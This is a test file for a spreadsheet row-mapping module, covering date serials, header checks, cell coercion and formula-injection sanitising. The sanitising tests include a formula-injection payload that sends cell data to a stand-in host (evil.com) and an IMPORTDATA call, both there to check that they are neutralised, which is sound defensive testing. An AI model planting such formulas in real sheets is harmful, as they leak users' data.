import { describe, expect, it } from 'vitest'
import {
  coerceCell,
  columnLetter,
  HeaderContractError,
  indexHeaders,
  isoToSerial,
  recordToRow,
  rowToRecord,
  sanitizeText,
  serialToIso,
} from './rows'
import { entities, expectedHeaders, type Field } from '../config/schema'

const FEATURE = entities.feature
const ACTION = entities.action

const featureHeaders = [...expectedHeaders(FEATURE)]
const actionHeaders = [...expectedHeaders(ACTION)]

describe('date serials', () => {
  // Anchor cases, verifiable by typing the date into a Sheet cell and reading
  // it back with UNFORMATTED_VALUE.
  it.each([
    [1, '1899-12-31'],
    [2, '1900-01-01'],
    [25569, '1970-01-01'], // Unix epoch — the standard cross-check
    [46248, '2026-08-14'],
  ])('serial %i ↔ %s', (serial, iso) => {
    expect(serialToIso(serial)).toBe(iso)
    expect(isoToSerial(iso)).toBe(serial)
  })

  it('round-trips across a leap day', () => {
    const iso = '2024-02-29'
    expect(serialToIso(isoToSerial(iso)!)).toBe(iso)
  })

  it('rounds a serial carrying a time component to its own day', () => {
    // 09:00 on the same day, and a float artefact just short of midnight.
    expect(serialToIso(46248.375)).toBe('2026-08-14')
    expect(serialToIso(46247.999999)).toBe('2026-08-14')
  })

  it('is timezone-independent', () => {
    // Would fail if the conversion used local time in a negative-offset zone.
    expect(serialToIso(46248)).toBe('2026-08-14')
    expect(isoToSerial('2026-08-14')).toBe(46248)
  })

  it('rejects malformed input rather than inventing a date', () => {
    expect(isoToSerial('14/08/2026')).toBeNull()
    expect(isoToSerial('not a date')).toBeNull()
    expect(serialToIso(Number.NaN)).toBeNull()
  })

  it('matches the workbook serials the migration has to read', () => {
    // Pinned from the source .xlsm, so a change to the epoch is caught here
    // rather than by someone noticing every imported date is off by a day.
    expect(serialToIso(46229)).toBe('2026-07-26')
    expect(serialToIso(46240)).toBe('2026-08-06')
  })
})

describe('indexHeaders', () => {
  it('maps every expected column to its position', () => {
    const index = indexHeaders(featureHeaders, FEATURE)
    expect(index.get('id')).toBe(0)
    expect(index.get('name')).toBe(6)
  })

  it('tolerates re-ordered and extra columns', () => {
    const reordered = [...featureHeaders].reverse()
    const index = indexHeaders([...reordered, 'someone_else_added_this'], FEATURE)
    expect(index.get('id')).toBe(reordered.indexOf('id'))
  })

  it('names the missing column instead of failing later', () => {
    const withoutStatus = featureHeaders.filter((h) => h !== 'status')
    expect(() => indexHeaders(withoutStatus, FEATURE)).toThrow(HeaderContractError)
    expect(() => indexHeaders(withoutStatus, FEATURE)).toThrow(/`status`/)
  })

  it('names the tab, so the reader knows which sheet to fix', () => {
    const broken = actionHeaders.filter((h) => h !== 'featureId')
    expect(() => indexHeaders(broken, ACTION)).toThrow(/Actions tab/)
  })

  it('rejects one entity validated against another entity’s headers', () => {
    // The failure mode that a shared EXPECTED_HEADERS constant would hide.
    expect(() => indexHeaders(featureHeaders, ACTION)).toThrow(HeaderContractError)
  })
})

describe('coerceCell', () => {
  const number: Field = { key: 'n', label: 'N', type: 'number' }
  const date: Field = { key: 'd', label: 'D', type: 'date' }
  const text: Field = { key: 't', label: 'T', type: 'text' }
  const reference: Field = { key: 'c', label: 'C', type: 'reference', listKind: 'channel' }
  const link: Field = { key: 'f', label: 'F', type: 'link', refEntity: 'feature' }

  it('keeps bad values as text rather than throwing', () => {
    // A human typed prose into a number column. The row must still render.
    expect(coerceCell('ask Bob', number)).toBe('ask Bob')
    expect(coerceCell('sometime next week', date)).toBe('sometime next week')
  })

  it('treats blanks as null, not as zero or empty date', () => {
    expect(coerceCell('', number)).toBeNull()
    expect(coerceCell(null, date)).toBeNull()
    expect(coerceCell(undefined, text)).toBeNull()
  })

  it('converts date serials to ISO', () => {
    expect(coerceCell(46248, date)).toBe('2026-08-14')
  })

  it('preserves zero as a number', () => {
    expect(coerceCell(0, number)).toBe(0)
  })

  it('keeps a malformed date visible instead of blanking it', () => {
    // The workbook has exactly this: a Due Date typed as "1508/2026".
    expect(coerceCell('1508/2026', date)).toBe('1508/2026')
  })

  it('never coerces an identifier to a number, however numeric it looks', () => {
    // A slug or UUID that happens to parse as a number must stay a string, or
    // it stops matching the Lists id it is supposed to reference.
    expect(coerceCell('2026', reference)).toBe('2026')
    expect(coerceCell(2026, reference)).toBe('2026')
    expect(coerceCell('123e4567', link)).toBe('123e4567')
  })
})

describe('rowToRecord', () => {
  const index = indexHeaders(featureHeaders, FEATURE)

  it('maps housekeeping columns and domain fields', () => {
    const row = [
      'uuid-1',
      '2026-08-14T10:00:00Z',
      'a@example.com',
      '2026-08-14T11:00:00Z',
      'b@example.com',
      false,
      'Example Feature',
      'alpha',
      'alpha-r3',
      'alpha',
      'in-progress',
      'medium',
      'yes',
      'done',
      'owner-a',
      'some notes',
    ]

    const record = rowToRecord(row, index, FEATURE)
    expect(record.id).toBe('uuid-1')
    expect(record.deleted).toBe(false)
    expect(record.fields.name).toBe('Example Feature')
    expect(record.fields.channel).toBe('alpha')
  })

  it('reads a hand-typed TRUE in the deleted column', () => {
    const row = new Array(featureHeaders.length).fill('')
    row[index.get('deleted')!] = 'TRUE'
    expect(rowToRecord(row, index, FEATURE).deleted).toBe(true)
  })

  it('survives a short row', () => {
    // Sheets omits trailing empty cells, so rows arrive ragged.
    const record = rowToRecord(['uuid-2'], index, FEATURE)
    expect(record.id).toBe('uuid-2')
    expect(record.fields.name).toBeNull()
  })

  it('reads an action’s dates and feature link', () => {
    const actionIndex = indexHeaders(actionHeaders, ACTION)
    const row = new Array(actionHeaders.length).fill('')
    row[actionIndex.get('id')!] = 'uuid-a'
    row[actionIndex.get('featureId')!] = 'uuid-1'
    row[actionIndex.get('raisedOn')!] = 46229

    const record = rowToRecord(row, actionIndex, ACTION)
    expect(record.fields.featureId).toBe('uuid-1')
    expect(record.fields.raisedOn).toBe('2026-07-26')
  })
})

describe('sanitizeText — formula injection', () => {
  it.each(['=1+1', '=IMAGE("https://evil.com/?d="&A2)', '+A1', '-A1', '@SUM(A1)'])(
    'neutralises %s',
    (input) => {
      expect(sanitizeText(input)).toBe(`'${input}`)
    },
  )

  it('leaves ordinary text alone', () => {
    expect(sanitizeText('Write the plan')).toBe('Write the plan')
    expect(sanitizeText('a = b')).toBe('a = b') // not leading
    expect(sanitizeText('')).toBe('')
  })
})

describe('columnLetter', () => {
  it.each([
    [0, 'A'],
    [9, 'J'],
    [25, 'Z'],
    [26, 'AA'],
    [51, 'AZ'],
    [52, 'BA'],
  ])('%i → %s', (index, letter) => {
    expect(columnLetter(index)).toBe(letter)
  })
})

describe('recordToRow', () => {
  const index = indexHeaders(featureHeaders, FEATURE)
  const actionIndex = indexHeaders(actionHeaders, ACTION)

  const base = {
    id: 'uuid-1',
    createdAt: '2026-08-14T10:00:00Z',
    createdBy: 'a@example.com',
    updatedAt: '2026-08-14T11:00:00Z',
    updatedBy: 'b@example.com',
    deleted: false,
  }

  it('writes dates as serials, not text', () => {
    const row = recordToRow({ ...base, fields: { dueDate: '2026-08-14' } }, actionIndex, ACTION)
    expect(row[actionIndex.get('dueDate')!]).toBe(46248)
  })

  it('writes text fields as text', () => {
    const row = recordToRow({ ...base, fields: { name: 'x' } }, index, FEATURE)
    expect(row[index.get('name')!]).toBe('x')
  })

  it('sanitises a formula typed into a text field', () => {
    const row = recordToRow({ ...base, fields: { notes: '=IMPORTDATA("http://x")' } }, index, FEATURE)
    expect(row[index.get('notes')!]).toBe("'=IMPORTDATA(\"http://x\")")
  })

  it('round-trips through rowToRecord', () => {
    const fields = {
      name: 'Example Feature',
      channel: 'alpha',
      release: 'alpha-r3',
      status: 'in-progress',
      notes: 'hello',
    }
    const row = recordToRow({ ...base, fields }, index, FEATURE)
    const back = rowToRecord(row, index, FEATURE)

    expect(back.id).toBe('uuid-1')
    expect(back.deleted).toBe(false)
    expect(back.fields).toMatchObject(fields)
  })

  it('positions values by header index, not by declaration order', () => {
    const shuffled = [...featureHeaders].reverse()
    const shuffledIndex = indexHeaders(shuffled, FEATURE)
    const row = recordToRow({ ...base, fields: { name: 'x' } }, shuffledIndex, FEATURE)
    expect(row[shuffledIndex.get('name')!]).toBe('x')
    expect(row[shuffledIndex.get('id')!]).toBe('uuid-1')
  })

  it('writes only the entity it was given, never another entity’s fields', () => {
    // A stray value from the wrong entity must not land in a column that
    // happens to share a name.
    const row = recordToRow({ ...base, fields: { name: 'x', dueDate: '2026-08-14' } }, index, FEATURE)
    expect(row).toHaveLength(featureHeaders.length)
    expect(row.includes(46248)).toBe(false)
  })
})
